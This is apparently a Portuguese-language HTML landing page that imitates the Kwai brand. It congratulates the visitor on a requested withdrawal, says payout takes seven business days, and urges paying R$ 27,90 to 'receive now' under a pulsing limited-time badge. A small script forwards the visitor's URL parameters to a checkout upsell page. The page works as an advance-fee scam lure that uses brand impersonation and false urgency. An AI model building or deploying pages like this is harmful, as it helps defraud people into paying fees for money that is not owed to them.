<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <meta name="theme-color" content="#FF4906">
  <meta name="robots" content="max-image-preview:large">
  <title>Saque Solicitado - Kwai</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #FF4906 0%, #FF6B35 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 15px;
      position: relative;
      overflow: hidden;
    }

    /* Animated background circles */
    .bg-circle {
      position: absolute;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.1);
      animation: float 6s ease-in-out infinite;
    }

    .bg-circle:nth-child(1) {
      width: 250px;
      height: 250px;
      top: -125px;
      left: -125px;
      animation-delay: 0s;
    }

    .bg-circle:nth-child(2) {
      width: 150px;
      height: 150px;
      bottom: -75px;
      right: -75px;
      animation-delay: 2s;
    }

    @keyframes float {

      0%,
      100% {
        transform: translateY(0px) scale(1);
      }

      50% {
        transform: translateY(-15px) scale(1.05);
      }
    }

    .container {
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
      max-width: 420px;
      width: 100%;
      padding: 25px 20px;
      position: relative;
      z-index: 10;
      animation: slideUp 0.5s ease-out;
    }

    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(20px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .success-icon {
      width: 60px;
      height: 60px;
      background: linear-gradient(135deg, #00D084 0%, #00A86B 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 15px;
      animation: scaleIn 0.4s ease-out 0.2s both;
      box-shadow: 0 8px 20px rgba(0, 208, 132, 0.3);
    }

    .success-icon i {
      color: #fff;
      font-size: 30px;
    }

    @keyframes scaleIn {
      from {
        transform: scale(0);
        opacity: 0;
      }

      to {
        transform: scale(1);
        opacity: 1;
      }
    }

    h1 {
      font-size: 20px;
      font-weight: 800;
      color: #00D084;
      margin-bottom: 10px;
      text-align: center;
      animation: fadeIn 0.5s ease-out 0.3s both;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    .subtitle {
      font-size: 13px;
      color: #666;
      text-align: center;
      margin-bottom: 15px;
      line-height: 1.4;
      animation: fadeIn 0.5s ease-out 0.4s both;
    }

    .subtitle .highlight {
      color: #FF4906;
      font-weight: 700;
    }

    .offer-box {
      background: linear-gradient(135deg, #FFF5F0 0%, #FFE8DD 100%);
      border: 2px solid #FF4906;
      border-radius: 12px;
      padding: 15px;
      margin: 15px 0;
      animation: fadeIn 0.5s ease-out 0.5s both;
    }

    .offer-title {
      font-size: 15px;
      font-weight: 700;
      color: #FF4906;
      margin-bottom: 8px;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    .offer-title i {
      font-size: 16px;
    }

    .offer-text {
      font-size: 13px;
      color: #333;
      text-align: center;
      line-height: 1.4;
      margin-bottom: 8px;
    }

    .price {
      font-size: 26px;
      font-weight: 800;
      color: #FF4906;
      text-align: center;
      margin: 8px 0;
    }

    .urgency-badge {
      background: #FF4906;
      color: #fff;
      padding: 8px 15px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 700;
      text-align: center;
      margin: 12px 0;
      animation: pulse 2s ease-in-out infinite;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    @keyframes pulse {

      0%,
      100% {
        transform: scale(1);
        box-shadow: 0 0 0 0 rgba(255, 73, 6, 0.7);
      }

      50% {
        transform: scale(1.05);
        box-shadow: 0 0 0 8px rgba(255, 73, 6, 0);
      }
    }

    .cta-button {
      background: linear-gradient(135deg, #FF4906 0%, #FF6B35 100%);
      color: #fff;
      border: none;
      padding: 14px 30px;
      font-size: 16px;
      font-weight: 700;
      border-radius: 40px;
      cursor: pointer;
      width: 100%;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      box-shadow: 0 8px 20px rgba(255, 73, 6, 0.4);
      transition: all 0.3s ease;
      animation: fadeIn 0.5s ease-out 0.6s both;
      position: relative;
      overflow: hidden;
    }

    .cta-button:before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.3);
      transform: translate(-50%, -50%);
      transition: width 0.6s, height 0.6s;
    }

    .cta-button:hover:before {
      width: 300px;
      height: 300px;
    }

    .cta-button:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 30px rgba(255, 73, 6, 0.5);
    }

    .cta-button:active {
      transform: translateY(0);
    }
  </style>
</head>

<body>
  <div class="bg-circle"></div>
  <div class="bg-circle"></div>

  <div class="container">
    <div class="success-icon">
      <i class="fas fa-check"></i>
    </div>

    <h1>Saque Solicitado com Sucesso!</h1>

    <p class="subtitle">
      O seu saque será processado em até <span class="highlight">7 DIAS ÚTEIS</span>.
    </p>

    <div class="offer-box">
      <div class="offer-title">
        <i class="fas fa-bolt"></i>
        EVITE A ESPERA
      </div>
      <p class="offer-text">
        Antecipe e receba <strong>IMEDIATAMENTE</strong> pagando apenas:
      </p>
      <div class="price">R$ 27,90</div>
    </div>

    <div class="urgency-badge">
      <i class="fas fa-clock"></i>
      Oferta válida por tempo limitado!
    </div>

    <button class="cta-button" onclick="redirectToPayment()">
      <span style="position: relative; z-index: 1;">RECEBER AGORA</span>
    </button>
  </div>

  <script>
    // Função para capturar os parâmetros GET da URL atual
    function getUrlParams() {
      const params = new URLSearchParams(window.location.search);
      let paramsObject = {};
      params.forEach((value, key) => {
        paramsObject[key] = value;
      });
      return paramsObject;
    }

    //reescrever redirects pra incluir parametros
    function redirectWithParams(baseUrl) {
      const params = getUrlParams();
      const url = new URL(baseUrl, window.location);

      Object.keys(params).forEach(key => {
        url.searchParams.set(key, params[key]);
      });

      window.location.href = url.toString();
    }

    function redirectToPayment() {
      redirectWithParams("checkout/?up=4");
    }
  </script>
</body>

</html>
